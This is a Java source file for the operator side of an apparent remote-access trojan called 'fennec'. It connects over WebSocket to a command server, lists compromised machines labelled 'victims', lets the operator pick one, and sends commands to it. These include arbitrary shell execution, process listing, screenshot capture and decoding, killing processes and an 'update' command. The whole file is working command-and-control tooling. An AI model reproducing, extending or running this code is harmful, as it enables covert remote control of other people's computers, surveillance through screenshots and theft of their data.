package com.heshanthenura.fennec;

// new branch

import java.io.DataInput;
import java.io.IOException;
import java.net.URI;
import java.util.*;
import java.util.logging.Logger;
import java.util.stream.Collectors;

import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import org.java_websocket.client.WebSocketClient;
import org.java_websocket.handshake.ServerHandshake;



public class Client extends WebSocketClient {

    public static Commands commands = new Commands();
    public static Logger logger = Logger.getLogger("info");
    public static ArrayList<String> victims = new ArrayList<>();
    public static String selectedVictim = null;
    public static String myID = null;

    public Client(URI serverUri) {
        super(serverUri);
    }

    @Override
    public void onOpen(ServerHandshake serverHandshake) {
        System.out.println("Connected to server: ");
        send(commands.setRole());
        send(commands.getVictims());
    }

    @Override
    public void onMessage(String message) {
        logger.info(message);
        try {
            ObjectMapper objectMapper = new ObjectMapper();
            JsonNode jsonNode = objectMapper.readTree(message);
            if (jsonNode.get("type").asText().equals("notify")){
                System.out.println(jsonNode.get("data").asText());
            } else if (jsonNode.get("type").asText().equals("info")) {
                if (jsonNode.get("info_name").asText().equals("lv")) {
                    JsonNode dataArray = jsonNode.get("data");
                    if (dataArray.isArray()) { // Ensure it's an array
                        victims.clear();
                        for (int i = 0; i < dataArray.size(); i++) {
                            String victim = dataArray.get(i).asText();
                            victims.add(victim);
                            System.out.println("[" + i + "] " + victim);
                        }
                    }
                }else if(jsonNode.get("info_name").asText().equals("my_id")){
                    myID=jsonNode.get("data").asText();
                    System.out.println("My ID is: "+myID);
                }
            } else if (jsonNode.get("type").asText().equals("exec")) {
                if (jsonNode.get("state").asText().equals("res")) {
                    if (jsonNode.get("command").asText().equals("tasklist")) {
                        String dataString = jsonNode.get("data").asText(); // Get the stringified array
                        // Convert the string back to an array
                        String[] taskList = objectMapper.readValue(dataString, String[].class);

                        System.out.println("Tasklist:");
                        for (String task : taskList) {
                            System.out.println(task);
                        }

                    } else if(jsonNode.get("command").asText().equals("ss")) {
                        commands.decodeImg(jsonNode.get("data").asText());
                    }else if(jsonNode.get("command").asText().equals("cmd")){
                        System.out.println(jsonNode.get("data").asText().replace("\\n", "\n").replace("\"", ""));
                    }else {
                        System.out.println(jsonNode.get("data").asText());
                    }
                }
            }

        } catch (JsonProcessingException e) {
            throw new RuntimeException(e);
        }

    }

    @Override
    public void onClose(int code, String reason, boolean remote) {
        System.out.println("Connection closed: " + reason);
    }

    @Override
    public void onError(Exception ex) {
        ex.printStackTrace();
    }

    public static String getSelectedVictim() {
        return selectedVictim;
    }

    public static void setSelectedVictim(String selectedVictim) {
        Client.selectedVictim = selectedVictim;
    }

    public static ArrayList<String> getVictims() {
        return victims;
    }

    public static void main(String[] args) {
        try {
            URI serverUri = new URI("ws://192.168.1.101:20888/ws");
            Client client = new Client(serverUri);
            client.connect();

            while (!client.isOpen()) {

            }


            Scanner scanner = new Scanner(System.in);


            while (true) {
                String message = scanner.nextLine();

                String[] splitMsg = message.split(" ");

                if ("exit".equalsIgnoreCase(message)) {
                    client.close();
                    System.exit(0);
                    break;
                }

                if(message.equals("lv")){
                    client.send(commands.getVictims());
                }else if (message.startsWith("sv ")) {
                    if (getVictims().isEmpty()){
                        System.out.println("Victim list empty try refreshing by lv");
                    }else {
                        try{
                            if (Integer.parseInt(splitMsg[1])>(getVictims().size()-1)){
                                System.out.println("Victim number out of bound");
                            }else{
                                setSelectedVictim(getVictims().get(Integer.parseInt(splitMsg[1])));
                                System.out.println("Victim Selected : "+getVictims().get(Integer.parseInt(splitMsg[1])));

                            }
                        }catch (Exception e){
                            System.out.println("Error Selecting Victims");
                        }
                    }
                } else if(message.startsWith("exec ")){
                    if (getSelectedVictim()==null){
                        System.out.println("No victims selected to execute commands");
                    }else if(splitMsg[1].equals("kill")){
                        client.send(commands.exec(myID,getSelectedVictim(), splitMsg[1]+" "+splitMsg[2]));

                    }else if(splitMsg[1].equals("update")){
                        client.send(commands.exec(myID,getSelectedVictim(), splitMsg[1]+" "+splitMsg[2]+" "+splitMsg[3]));

                    }else{
                        String newMessage = Arrays.stream(splitMsg).skip(1).collect(Collectors.joining(" "));
                        client.send(commands.exec(myID,getSelectedVictim(), newMessage));
                    }
                }

            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
